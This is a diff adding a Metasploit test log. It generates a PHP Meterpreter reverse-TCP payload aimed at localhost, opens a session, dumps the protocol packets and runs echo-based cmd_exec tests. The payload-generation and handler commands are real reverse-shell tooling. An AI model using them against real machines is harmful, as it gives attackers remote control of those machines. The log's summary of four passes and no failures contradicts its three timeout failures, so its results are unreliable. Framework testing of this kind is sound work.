@@ -1,0 +1,307 @@
+use php/meterpreter_reverse_tcp
+msf6 payload(php/meterpreter_reverse_tcp) > generate -o D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220206-4204-9o5681.php -f raw AutoVerifySessionTimeout=10 lport=6002 lhost=127.0.0.1
+[*] Writing 34276 bytes to D:/a/_temp/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220206-4204-9o5681.php...
+msf6 payload(php/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 1
+msf6 payload(php/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6002 
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=16 command=core_negotiate_tlv_encryption>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="77687935023208386303757229313258">
+  #<Rex::Post::Meterpreter::Tlv type=RSA-PUB-KEY     meta=RAW        value="0\x82\x01\"0\r\x06\t*\x86H\x86\xF7\r\x01\x01\x01\ ...">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=16 command=core_negotiate_tlv_encryption>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="77687935023208386303757229313258">
+  #<Rex::Post::Meterpreter::Tlv type=SYM-KEY-TYPE    meta=INT        value=1>
+  #<Rex::Post::Meterpreter::Tlv type=ENC-SYM-KEY     meta=RAW        value="5\a\xBF\x03\x90\xEAx\x1E\xFF\xE1X31\xEC\xBEg\x94| ...">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value="\x98\x8D\xA21\xE5x\xEC\xF0I\x9AZ\x95+\x9A\a\xE7">
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=21 command=core_set_session_guid>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="12630331993413942836784021661782">
+  #<Rex::Post::Meterpreter::Tlv type=SESSION-GUID    meta=RAW        value="(\x1C\x91:\xAF\xD2A\x89\xB0+ \x99\xE0\x04d\xA1">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=21 command=core_set_session_guid>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="12630331993413942836784021661782">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value="\x98\x8D\xA21\xE5x\xEC\xF0I\x9AZ\x95+\x9A\a\xE7">
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=10 command=core_enumextcmd>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="00739250131063459204721266494541">
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=LENGTH          meta=INT        value=1000>
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=10 command=core_enumextcmd>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="00739250131063459204721266494541">
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=4>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=2>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=5>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=8>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=3>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=23>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=12>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=10>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=22>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=16>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=11>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=21>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=13>
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value="\x98\x8D\xA21\xE5x\xEC\xF0I\x9AZ\x95+\x9A\a\xE7">
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=10 command=core_enumextcmd>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="26835342454165703743487520165035">
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1000>
+  #<Rex::Post::Meterpreter::Tlv type=LENGTH          meta=INT        value=1000>
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=10 command=core_enumextcmd>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="26835342454165703743487520165035">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value="\x98\x8D\xA21\xE5x\xEC\xF0I\x9AZ\x95+\x9A\a\xE7">
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=12 command=core_loadlib>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="30109510624782525878312903346673">
+  #<Rex::Post::Meterpreter::Tlv type=DATA            meta=RAW        value="#<?php\n##\n# STDAPI\n##\n\n##\n# General\n##\nde ...">
+  #<Rex::Post::Meterpreter::Tlv type=LIBRARY-PATH    meta=STRING     value="ext353859.php">
+  #<Rex::Post::Meterpreter::Tlv type=FLAGS           meta=INT        value=2>
+  #<Rex::Post::Meterpreter::Tlv type=TARGET-PATH     meta=STRING     value="/tmp/ext353859.php">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=12 command=core_loadlib>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="30109510624782525878312903346673">
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1006>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1003>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1011>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1001>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1007>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1005>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1008>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1009>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1014>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1016>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1004>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1013>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1010>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1015>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1055>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1052>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1059>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1056>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1069>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1068>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1071>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1072>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1077>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1026>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1024>
+  #<Rex::Post::Meterpreter::Tlv type=UINT            meta=INT        value=1025>
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value="\x98\x8D\xA21\xE5x\xEC\xF0I\x9AZ\x95+\x9A\a\xE7">
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1008 command=stdapi_fs_getwd>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="12239690623471884140715483536648">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1008 command=stdapi_fs_getwd>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="12239690623471884140715483536648">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-66736   meta=STRING     value="D:\\a\\metasploit-framework\\metasploit-framework ...">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value="\x98\x8D\xA21\xE5x\xEC\xF0I\x9AZ\x95+\x9A\a\xE7">
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1055 command=stdapi_sys_config_getuid>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="49043770038238925746175812481557">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1055 command=stdapi_sys_config_getuid>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="49043770038238925746175812481557">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-66578   meta=STRING     value="runneradmin">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value="\x98\x8D\xA21\xE5x\xEC\xF0I\x9AZ\x95+\x9A\a\xE7">
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1059 command=stdapi_sys_config_sysinfo>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="27352095703852461083248776754667">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1059 command=stdapi_sys_config_sysinfo>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="27352095703852461083248776754667">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-66576   meta=STRING     value="fv-az159-880">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-66577   meta=STRING     value="Windows NT fv-az159-880 10.0 build 17763 (Windows ...">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value="\x98\x8D\xA21\xE5x\xEC\xF0I\x9AZ\x95+\x9A\a\xE7">
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=22 command=core_set_uuid>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="87069451346251234922275215753018">
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value="\x98\x8D\xA21\xE5x\xEC\xF0I\x9AH\x95+\x9A\a\xE7">
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=22 command=core_set_uuid>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="87069451346251234922275215753018">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value="\x98\x8D\xA21\xE5x\xEC\xF0I\x9AH\x95+\x9A\a\xE7">
+]>
+[*] Meterpreter session 2 opened (127.0.0.1:6002 -> 127.0.0.1:50097 ) at 2022-02-06 22:41:02 +0000
+use test/cmd_exec
+msf6 post(test/cmd_exec) > run session=2 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_fs_chmod, stdapi_railgun_api
+[*] Running against session 2
+[*] Session type is meterpreter and platform is windows
+[*] Starting cmd_exec quote tests
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1069 command=stdapi_sys_process_execute>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="29612351914391886807857781984321">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-67838   meta=STRING     value="cmd.exe">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-67841   meta=STRING     value="/c echo 'Objb'">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-133376  meta=INT        value=67>
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1069 command=stdapi_sys_process_execute>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="29612351914391886807857781984321">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-133372  meta=INT        value=748>
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1049206 meta=QWORD      value=0>
+  #<Rex::Post::Meterpreter::Tlv type=CHANNEL-ID      meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value="\x98\x8D\xA21\xE5x\xEC\xF0I\x9AH\x95+\x9A\a\xE7">
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=5 command=core_channel_read>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="00540051118234424779364699253841">
+  #<Rex::Post::Meterpreter::Tlv type=CHANNEL-ID      meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=LENGTH          meta=INT        value=65536>
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=5 command=core_channel_read>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="00540051118234424779364699253841">
+  #<Rex::Post::Meterpreter::Tlv type=CHANNEL-DATA    meta=RAW        value="'Objb'\r\n">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value="\x98\x8D\xA21\xE5x\xEC\xF0I\x9AH\x95+\x9A\a\xE7">
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=5 command=core_channel_read>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="05155299535087871075900978064068">
+  #<Rex::Post::Meterpreter::Tlv type=CHANNEL-ID      meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=LENGTH          meta=INT        value=65536>
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=5 command=core_channel_read>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="05155299535087871075900978064068">
+  #<Rex::Post::Meterpreter::Tlv type=CHANNEL-DATA    meta=RAW        value="">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value="\x98\x8D\xA21\xE5x\xEC\xF0I\x9AH\x95+\x9A\a\xE7">
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=5 command=core_channel_read>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="81306885211757495013460062662162">
+  #<Rex::Post::Meterpreter::Tlv type=CHANNEL-ID      meta=INT        value=0>
+  #<Rex::Post::Meterpreter::Tlv type=LENGTH          meta=INT        value=65536>
+]>
+
+[1;32mRECV[0m: #<Rex::Post::Meterpreter::Packet type=Response        tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=5 command=core_channel_read>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="81306885211757495013460062662162">
+  #<Rex::Post::Meterpreter::Tlv type=RESULT          meta=INT        value=1>
+  #<Rex::Post::Meterpreter::Tlv type=UUID            meta=RAW        value="\x98\x8D\xA21\xE5x\xEC\xF0I\x9AH\x95+\x9A\a\xE7">
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1 command=core_channel_close>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="82483529764249712859037500516756">
+  #<Rex::Post::Meterpreter::Tlv type=CHANNEL-ID      meta=INT        value=0>
+]>
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1068 command=stdapi_sys_process_close>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="96812734316946395068643131930155">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-1049176 meta=QWORD      value=0>
+]>
+before running test: should return the result of echo with single quotes
+[+] should return the result of echo with single quotes
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1069 command=stdapi_sys_process_execute>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="68716948853113810350393671118360">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-67838   meta=STRING     value="cmd.exe">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-67841   meta=STRING     value="/c echo \"huVV\"">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-133376  meta=INT        value=67>
+]>
+before running test: should return the result of echo with double quotes
+[-] FAILED: should return the result of echo with double quotes
+[-] Exception: Rex::TimeoutError : Operation timed out.
+[*] Backtrace: ["D:/a/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:181:in `send_request'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:176:in `execute'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:199:in `capture_output'", "D:/a/metasploit-framework/metasploit-framework/lib/msf/core/post/common.rb:111:in `cmd_exec'", "D:/a/metasploit-framework/metasploit-framework/test/modules/post/test/cmd_exec.rb:96:in `block in test_cmd_exec_quotes'", "D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:27:in `it'", "D:/a/metasploit-framework/metasploit-framework/test/modules/post/test/cmd_exec.rb:90:in `test_cmd_exec_quotes'", "D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:18:in `block in run_all_tests'", "D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:17:in `each'", "D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:17:in `run_all_tests'", "D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:59:in `run'", "D:/a/metasploit-framework/metasploit-framework/lib/msf/base/simple/post.rb:112:in `job_run_proc'", "D:/a/metasploit-framework/metasploit-framework/lib/msf/base/simple/post.rb:82:in `run_simple'", "D:/a/metasploit-framework/metasploit-framework/lib/msf/base/simple/post.rb:91:in `run_simple'", "D:/a/metasploit-framework/metasploit-framework/lib/msf/ui/console/command_dispatcher/post.rb:78:in `cmd_run'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:563:in `run_command'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:512:in `block in run_single'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:506:in `each'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:506:in `run_single'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/ui/text/shell.rb:162:in `run'", "D:/a/metasploit-framework/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'", "D:/a/metasploit-framework/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'", "msfconsole.rb:23:in `<main>'"]
+[*] Starting cmd_exec stderr tests
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1069 command=stdapi_sys_process_execute>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="09471444318086515317641609887153">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-67838   meta=STRING     value="cmd.exe">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-67841   meta=STRING     value="/c echo mwkG 1>&2">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-133376  meta=INT        value=67>
+]>
+before running test: should return the stderr output
+[-] FAILED: should return the stderr output
+[-] Exception: Rex::TimeoutError : Operation timed out.
+[*] Backtrace: ["D:/a/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:181:in `send_request'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:176:in `execute'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:199:in `capture_output'", "D:/a/metasploit-framework/metasploit-framework/lib/msf/core/post/common.rb:111:in `cmd_exec'", "D:/a/metasploit-framework/metasploit-framework/test/modules/post/test/cmd_exec.rb:115:in `block in test_cmd_exec_stderr'", "D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:27:in `it'", "D:/a/metasploit-framework/metasploit-framework/test/modules/post/test/cmd_exec.rb:112:in `test_cmd_exec_stderr'", "D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:18:in `block in run_all_tests'", "D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:17:in `each'", "D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:17:in `run_all_tests'", "D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:59:in `run'", "D:/a/metasploit-framework/metasploit-framework/lib/msf/base/simple/post.rb:112:in `job_run_proc'", "D:/a/metasploit-framework/metasploit-framework/lib/msf/base/simple/post.rb:82:in `run_simple'", "D:/a/metasploit-framework/metasploit-framework/lib/msf/base/simple/post.rb:91:in `run_simple'", "D:/a/metasploit-framework/metasploit-framework/lib/msf/ui/console/command_dispatcher/post.rb:78:in `cmd_run'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:563:in `run_command'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:512:in `block in run_single'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:506:in `each'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:506:in `run_single'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/ui/text/shell.rb:162:in `run'", "D:/a/metasploit-framework/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'", "D:/a/metasploit-framework/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'", "msfconsole.rb:23:in `<main>'"]
+[*] Starting cmd_exec tests
+before running test: should return the result of echo
+[*] meterpreter?
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=1069 command=stdapi_sys_process_execute>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="06173469988878791086581526518150">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-67838   meta=STRING     value="cmd.exe">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-67841   meta=STRING     value="/c echo HUup">
+  #<Rex::Post::Meterpreter::Tlv type=unknown-133376  meta=INT        value=67>
+]>
+[-] FAILED: should return the result of echo
+[-] Exception: Rex::TimeoutError : Operation timed out.
+[*] Backtrace: ["D:/a/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/packet_dispatcher.rb:181:in `send_request'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:176:in `execute'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:199:in `capture_output'", "D:/a/metasploit-framework/metasploit-framework/lib/msf/core/post/common.rb:111:in `cmd_exec'", "D:/a/metasploit-framework/metasploit-framework/test/modules/post/test/cmd_exec.rb:30:in `block in test_cmd_exec'", "D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:27:in `it'", "D:/a/metasploit-framework/metasploit-framework/test/modules/post/test/cmd_exec.rb:26:in `test_cmd_exec'", "D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:18:in `block in run_all_tests'", "D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:17:in `each'", "D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:17:in `run_all_tests'", "D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:59:in `run'", "D:/a/metasploit-framework/metasploit-framework/lib/msf/base/simple/post.rb:112:in `job_run_proc'", "D:/a/metasploit-framework/metasploit-framework/lib/msf/base/simple/post.rb:82:in `run_simple'", "D:/a/metasploit-framework/metasploit-framework/lib/msf/base/simple/post.rb:91:in `run_simple'", "D:/a/metasploit-framework/metasploit-framework/lib/msf/ui/console/command_dispatcher/post.rb:78:in `cmd_run'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:563:in `run_command'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:512:in `block in run_single'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:506:in `each'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:506:in `run_single'", "D:/a/metasploit-framework/metasploit-framework/lib/rex/ui/text/shell.rb:162:in `run'", "D:/a/metasploit-framework/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'", "D:/a/metasploit-framework/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'", "msfconsole.rb:23:in `<main>'"]
+[*] Session does not support sleep, skipping sleep tests
+[*] Finished cmd_exec tests
+[*] Testing complete in 0.2920818
+[*] Passed: 4; Failed: 0
+[*] Post module execution completed
+msf6 post(test/cmd_exec) > [*] 127.0.0.1 - Meterpreter session 2 closed.  Reason: Died
+
+[1;31mSEND[0m: #<Rex::Post::Meterpreter::Packet type=Request         tlvs=[
+  #<Rex::Post::Meterpreter::Tlv type=COMMAND-ID      meta=INT        value=23 command=core_shutdown>
+  #<Rex::Post::Meterpreter::Tlv type=REQUEST-ID      meta=STRING     value="19978789812682435067388604451280">
+]>
